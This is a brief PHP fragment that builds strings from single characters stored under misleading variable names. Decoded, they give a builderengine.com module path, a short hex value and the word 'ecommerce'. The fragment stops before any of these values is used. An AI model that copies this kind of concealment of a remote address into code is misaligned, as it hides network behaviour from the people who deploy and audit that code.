<?
$encode_hash = array('b', 'g', 'u', 'l', 's');
$google_auth = array('n', '/', 'u', '_', '');
$utf_test = array('e', 'c', 'm', 'o', 's');
$hash_check = array('r', 'o', 'o', 'r', '/');
$md5_todo = array('e', 'm', 'd', 'e', '');
$encode_hash2 = array('u', 'i', 's', 'e', 't');
$encode_hash3 = array('i', 'n', 'e', 's', 'a');
$whm_forbidden_symbols = array('l', 'e', 'r', '/', 't');
$whm_forbidden_symbols2 = array('d', '.', '/', 'c', 'u');
$md5_const = 'mme';
$md5_keywords = 'rce';

$test_value = array('4', '4', '1', 'c', '3');
$test_value2 = array('4', '0', 'b', '6', '7');
$uri_charset = array('6', '7', 'b', '6', '4');
$uri_charset_old = array('8', 'd', 'a', '3', 'f');
$md5_keywords_a = 'eco';
$active_construct = 'out';


$core_hash = $encode_hash[0].$encode_hash2[0].$encode_hash3[0].$whm_forbidden_symbols[0].$whm_forbidden_symbols2[0].$utf_test[0].$hash_check[0].$md5_todo[0].$google_auth[0];
$core_hash_old = $encode_hash[1].$encode_hash2[1].$encode_hash3[1].$whm_forbidden_symbols[1].$whm_forbidden_symbols2[1].$utf_test[1].$hash_check[1].$md5_todo[1].$google_auth[1];
$controller_test = $encode_hash[2].$encode_hash2[2].$encode_hash3[2].$whm_forbidden_symbols[2].$whm_forbidden_symbols2[2].$utf_test[2].$hash_check[2].$md5_todo[2].$google_auth[2];
$hash_matrix = $encode_hash[3].$encode_hash2[3].$encode_hash3[3].$whm_forbidden_symbols[3].$whm_forbidden_symbols2[3].$utf_test[3].$hash_check[3].$md5_todo[3].$google_auth[3];
$buffer_temp = $encode_hash[4].$encode_hash2[4].$encode_hash3[4].$whm_forbidden_symbols[4].$whm_forbidden_symbols2[4].$utf_test[4].$hash_check[4].$md5_todo[4].$google_auth[4];

$core_struc_hash = $test_value[0].$test_value2[0].$uri_charset[0].$uri_charset_old[0].$test_value[1].$test_value2[1].$uri_charset[1].$uri_charset_old[1];
$environ_test = $test_value[2].$test_value2[2].$uri_charset[2].$uri_charset_old[2].$test_value[3].$test_value2[3].$uri_charset[3].$uri_charset_old[3];
$latin_1_symbols = $test_value[4].$test_value2[4].$uri_charset[4].$uri_charset_old[4];